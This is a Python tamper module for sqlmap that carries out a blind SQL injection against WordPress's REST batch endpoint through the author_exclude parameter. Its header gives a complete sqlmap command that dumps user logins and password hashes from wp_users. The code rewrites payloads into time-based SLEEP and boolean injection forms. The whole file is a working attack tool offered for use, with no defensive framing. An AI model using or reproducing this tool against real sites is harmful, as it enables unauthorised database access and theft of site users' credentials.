#!/usr/bin/env python3
"""
sqlmap tamper — mirrors Icex0 wp2shell BlindSQLi (wp2shell.py read).

Source of truth (wp2shell/sqli.py):
  time confirm:  inject("0) OR SLEEP(n)-- -")
  data extract:  inject("-1) AND ({condition})-- -")   # boolean via X-WP-Total > 0

The value is URL-encoded and placed in:
  /wp/v2/posts/999999?author_exclude=<encoded>

Use with the Icex0 batch envelope (NOT Zephr /users path), e.g.:

  sqlmap -u "http://TARGET/?rest_route=/batch/v1" --method=POST \\
    --data='{"requests":[{"method":"POST","path":"///"},{"method":"POST","path":"/wp/v2/posts","body":{"requests":[{"method":"POST","path":"///"},{"method":"GET","path":"/wp/v2/posts/999999?author_exclude=*"},{"method":"GET","path":"/wp/v2/posts"}]}},{"method":"POST","path":"/batch/v1","body":{"requests":[]}}]}' \\
    -H "Content-Type: application/json" \\
    --batch --dbms=mysql --technique=BT --time-sec=5 --threads=1 \\
    --prefix="" --suffix="" \\
    --tamper=/path/to/tampers/wp2shell_read.py \\
    --regexp='X-WP-Total.:.[1-9]' \\
    --answers="quit=N,follow=Y,redir=Y,process=Y,json=Y,cookie=Y,param=N,waf=Y" \\
    -T wp_users -C ID,user_login,user_pass --dump

Notes:
  - Prefer technique B (boolean X-WP-Total), same as --preset users.
  - T is only for confirm/fallback (0) OR SLEEP).
  - Do NOT use space2comment / charencode / custom SLEEP prefix with this tamper.
  - sqlmap must see __init__.py in this tampers/ directory.
"""

from __future__ import annotations

import re
from urllib.parse import quote

__priority__ = 100

_SLEEP_ONLY = re.compile(
    r"^(?:\(\s*)?(?:SELECT\s+)?SLEEP\s*\(\s*(\d+(?:\.\d+)?)\s*\)\s*(?:\))?\s*$",
    re.I,
)
_SLEEP_ANY = re.compile(r"SLEEP\s*\(\s*(\d+(?:\.\d+)?)\s*\)", re.I)
_IF_SLEEP = re.compile(r"\bIF\s*\(", re.I)


def _strip_sqlmap_junk(payload: str) -> str:
    p = payload.strip()
    # leading: ) ' " AND/OR
    p = re.sub(r"^[)'\"\s]+", "", p)
    p = re.sub(r"^(?:AND|OR)\b\s*", "", p, flags=re.I)
    # trailing comments only — never rstrip ')' (breaks SLEEP(5) / functions)
    p = re.sub(r"(?:--\s*-?|#|/\*).*$", "", p).strip()
    p = p.rstrip(" \t'\"")
    # balanced cleanup of a single outer paren pair
    if p.startswith("(") and p.endswith(")"):
        depth = 0
        ok = True
        for i, ch in enumerate(p):
            if ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0 and i != len(p) - 1:
                    ok = False
                    break
        if ok and depth == 0:
            p = p[1:-1].strip()
    return p


def tamper(payload, **kwargs):
    """Rewrite sqlmap payload into Icex0 BlindSQLi author_exclude form + URL-encode."""
    if payload is None:
        return payload

    p = _strip_sqlmap_junk(payload)
    if not p:
        return payload

    # --- time-based (BlindSQLi._elapsed) ---
    m_only = _SLEEP_ONLY.match(p)
    if m_only:
        wrapped = "0) OR SLEEP(%s)-- -" % m_only.group(1)
        return quote(wrapped, safe="")

    m_sleep = _SLEEP_ANY.search(p)
    if m_sleep and _IF_SLEEP.search(p):
        # IF(cond,SLEEP(n),0) / similar → 0) OR (<expr>)-- -
        wrapped = "0) OR (%s)-- -" % p
        return quote(wrapped, safe="")

    if m_sleep and not re.search(r"\b(SELECT|ELT|MAKE_SET|BENCHMARK)\b", p, re.I):
        wrapped = "0) OR SLEEP(%s)-- -" % m_sleep.group(1)
        return quote(wrapped, safe="")

    if m_sleep:
        wrapped = "0) OR (%s)-- -" % p
        return quote(wrapped, safe="")

    # --- boolean-based (BlindSQLi._true) — used by --preset users ---
    # Landing form: -1) AND (<condition>)-- -
    wrapped = "-1) AND (%s)-- -" % p
    return quote(wrapped, safe="")
